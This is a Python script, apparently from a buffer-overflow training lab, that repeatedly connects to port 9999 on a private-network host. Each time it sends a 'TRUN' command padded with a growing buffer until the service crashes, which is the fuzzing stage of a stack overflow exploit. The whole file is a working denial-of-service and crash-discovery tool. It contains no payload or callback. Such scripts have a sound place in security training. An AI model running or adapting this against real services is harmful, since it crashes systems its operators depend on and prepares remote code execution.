#!/usr/bin/env python3
import sys, socket
from time import sleep

starting_buffer = b"TRUN /.:/^FUZZ^"
RHOST = "192.168.0.109"
RPORT = 9999
connection_timeout = 2
sleep_delay = 1
buffer_step_size = 1
buffer_start_size = 2000

buffer = b"1" * buffer_start_size

socket.setdefaulttimeout(connection_timeout)

while True:
    try:
        buffer = buffer + b"1" * buffer_step_size
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((RHOST, RPORT))
        print("Sending buffer with a length of: " + str(len(buffer)))
        s.send(starting_buffer.replace(b"^FUZZ^", buffer))
        s.close()
        sleep(1)
    except:
        print("Last buffer probably crashed server :(")
        sys.exit(0)